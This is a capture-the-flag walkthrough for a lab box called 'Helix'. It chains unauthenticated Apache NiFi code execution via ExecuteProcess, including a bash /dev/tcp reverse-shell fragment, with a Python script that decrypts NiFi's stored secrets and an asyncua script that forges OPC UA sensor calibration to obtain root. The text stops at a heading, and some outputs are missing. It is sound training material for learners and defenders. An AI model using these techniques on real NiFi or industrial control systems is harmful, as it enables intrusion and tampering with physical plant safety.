Helix

A Medium Linux box built as an industrial plant, where each stage is hidden behind the one before it. A hidden vhost runs Apache NiFi with login disabled and execute-code granted to anonymous, so a processor is a shell. The operator's SSH key is sitting in NiFi's own support-bundles directory. Root is in the OT layer, where the reactor's temperature is calculated rather than measured and the OPC UA calibration term is writable, so forging it persuades the root safety controller to open a privileged maintenance window.

Orientation

Apache NiFi is a dataflow tool. You build a graph of processors in a browser, and every processor is a small piece of code that NiFi runs on your behalf, which is the whole foothold. The rest of the box is dressed as an OT plant, with the brochure as scenery and an OPC UA reactor simulation guarding root.

NiFi 1.21.0 does carry published CVEs, and checking them is the reflex. None of them are needed here. What follows is a configuration problem instead.

02

Foothold as nifianonymous access · execute-code · ExecuteProcess RCE

Two API calls decide whether this is going to be hard. The first asks whether NiFi even has a login, and the second asks who NiFi thinks you are.

who am I to NiFi?
db-d2@kali:~$ curl -s http://flow.helix.htb/nifi-api/access/config
{"config":{"supportsLogin":false}}

db-d2@kali:~$ curl -s http://flow.helix.htb/nifi-api/flow/current-user | jq '{identity, anonymous, restrictedComponentsPermissions}'
{
  "identity": "anonymous",
  "anonymous": true,
  "restrictedComponentsPermissions": { "canRead": true, "canWrite": true }
}

Login is disabled, so every request arrives as the built-in anonymous identity, and that identity has been granted write access to restricted components. Restricted components are the ones NiFi deliberately fences off because they let a flow author reach outside the JVM. The individual fences live in a separate array, and one of them is the one that matters.

the fence that is down
db-d2@kali:~$ curl -s http://flow.helix.htb/nifi-api/flow/current-user \
     | jq '.componentRestrictionPermissions[] | select(.requiredPermission.id=="execute-code")'
{
  "requiredPermission": { "id": "execute-code", "label": "execute code" },
  "permissions": { "canRead": true, "canWrite": true }
}
Why this is already over

An anonymous identity holding execute-code means anyone who can reach the port may create a processor whose entire job is to run a command. The permission is working exactly as designed, on a user who should never have had it. And the NiFi web UI is only a client for the REST API underneath, so anything the UI can do a curl can do without ever loading the page.

Picking the right processor

NiFi processors come in two kinds, and the difference decides whether the attack fires at all. Most are transforms. They sit waiting for a flowfile to arrive from an upstream processor, and with nothing upstream they never run. A few are source processors, which take no input and execute on their own schedule the moment you start them. ExecuteProcess is a source processor, so one of them alone on an empty canvas is enough. Its sibling ExecuteStreamCommand is a transform, and building the attack around that one means also building something to feed it.

Create one and read back its property descriptors, because guessing property names is the single easiest way to waste an afternoon here. NiFi accepts unknown property names without complaint and then ignores them.

create the processor, read its real properties

The two details that decide whether you get a shell

The arguments property is called Command Arguments, not Arguments. Send the wrong name and the API still returns HTTP 200, the processor still starts, and it runs your command with no arguments at all, which for bash means it exits immediately and nothing ever connects back.

The second detail is Argument Delimiter, which defaults to a single space. ExecuteProcess does not hand your command to a shell, it splits the arguments string on that delimiter and execs the result directly. With the default, -c bash -i >& /dev/tcp/... becomes eight separate arguments and bash -c receives only the word bash. Change the delimiter to ; and the payload stays in one piece as exactly two arguments.

Optimistic locking

Every mutating call carries the object's current revision.version, which the server increments on each accepted write. Read it back between calls rather than counting. NiFi will forgive a stale version if the clientId matches the one that made the last change, on the grounds that a client is allowed to race itself, but a different client identifier gets refused.

Aside: the credential you are supposed to need

The intended route hands you an OPC UA credential first. NiFi's flow definition holds a connection pool whose password is stored encrypted, and the key that protects it is sitting in the same directory in plaintext.

Read as nifi, conf/flow.json.gz contains "Database User":"operator" alongside a Password of enc{7de8f8ca9dda8c08...}, and conf/nifi.properties carries nifi.sensitive.props.key=TUHh+YHA30zmdlcA8xq/elNBLPkO03Nl with nifi.sensitive.props.algorithm=NIFI_PBKDF2_AES_GCM_256. That algorithm name is a complete specification. PBKDF2-HMAC-SHA512, 160 000 iterations, a hardcoded salt of "NiFi Static Salt" that is not stored in the blob, then AES-256-GCM laid out as IV(16) ‖ ciphertext ‖ tag(16). Because GCM authenticates, a decrypt that returns without raising is certainly right, which means there is nothing to verify by hand.

Your ciphertext will not match the one above. NiFi rewrites the flow with a fresh random IV, so the blob differs between instances while the plaintext does not.

decrypt the flow secret
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.ciphers.aead import AESGCM

props_key = "TUHh+YHA30zmdlcA8xq/elNBLPkO03Nl"   # nifi.properties
enc_hex   = "7de8f8ca9dda8c08e8f622e35a3f5239e8dda7183a0acb65..."  # enc{...} from flow.json.gz

blob = bytes.fromhex(enc_hex)
key  = PBKDF2HMAC(hashes.SHA512(), 32, b"NiFi Static Salt", 160000).derive(props_key.encode())
print(AESGCM(key).decrypt(blob[:16], blob[16:], None).decode())

This is the OPC UA operator credential, not an OS password. It will not log you into the host, and it does not need to, because the SSH key already did that.

And it turns out you do not need it

The plant accepts anonymous OPC UA sessions, and it accepts anonymous writes. Connecting with no credentials at all reads every node and successfully writes CalibrationOffset, with the change visible afterwards on the dashboard. The credential is clearly the designed path, and the rest of this write-up authenticates as operator because that is what the box intends, but the OPC UA server enforces nothing. In a real plant that is the more serious finding of the two.

The authorization is a file holding a unix timestamp. If the file exists and the number in it is in the future, you get /bin/bash -p -i as root. Nothing is signed and nobody is asked who wants the shell. The file sits under /opt/helix/state/, which is root-owned and closed to operator, so writing it by hand is out. It gets written by helix-safety.service, which runs as root and decides when to write it by looking at the plant.

Trust inversion: forge the sensor that the root process reads

The safety controller reads Temperature, the calibrated value, not the physical one. CalibrationOffset is writable by any OPC UA client. So an unprivileged client controls the number a root process uses to make a security decision, and can hold the reported temperature wherever it likes while the reactor itself stays at 284 °C.

What actually opens the window

The dashboard names a temperature threshold, but the temperature alone is not sufficient. The controller is a stripped PyInstaller binary, so rather than read its logic, establish it by experiment. Each trial below starts from a clean state and waits for any previous window to expire first, which matters because a window persists for its full duration and will otherwise make the next trial look like a success.

All three conditions are necessary and together they are sufficient. That is a coherent safety design rather than an arbitrary combination lock. A hazardous reading on its own is an emergency, and the correct response to an emergency is to trip the reactor, not to hand somebody a root shell. Mode=MAINTENANCE plus TestOverride is how an engineer says "this reading is a test, I am standing at the panel, do not treat it as real." The controller then reasons that a hazardous condition during authorized testing is exactly when an engineer needs privileged access, and it grants the window. Every input to that reasoning is writable over an unauthenticated protocol.

Three writes are enough from a clean start. ResetTrip is only needed if an earlier experiment latched a trip, and no hold loop is required, since the window opens within about two seconds and then stands on its own.

open the window
import asyncio
from asyncua import Client, ua

async def main():
    c = Client("opc.tcp://127.0.0.1:14840/helix/", timeout=20)
    c.set_user("operator"); c.set_password("R7qZ9L3xKM2W8pFYcA")
    await c.connect()
    W = lambda n, v, t: c.get_node(n).write_value(ua.DataValue(ua.Variant(v, t)))

    await W("ns=2;i=13", True, ua.VariantType.Boolean)           # TestOverride
    await W("ns=2;i=12", "MAINTENANCE", ua.VariantType.String)   # Mode
    raw = await c.get_node("ns=2;i=3").read_value()              # TemperatureRaw
    await W("ns=2;i=6", round(296.0 - raw, 2), ua.VariantType.Double)  # CalibrationOffset

    await asyncio.sleep(2)
    print("reported temperature =", await c.get_node("ns=2;i=4").read_value())
    await c.disconnect()

asyncio.run(main())

The bug

Neither component is individually wrong.
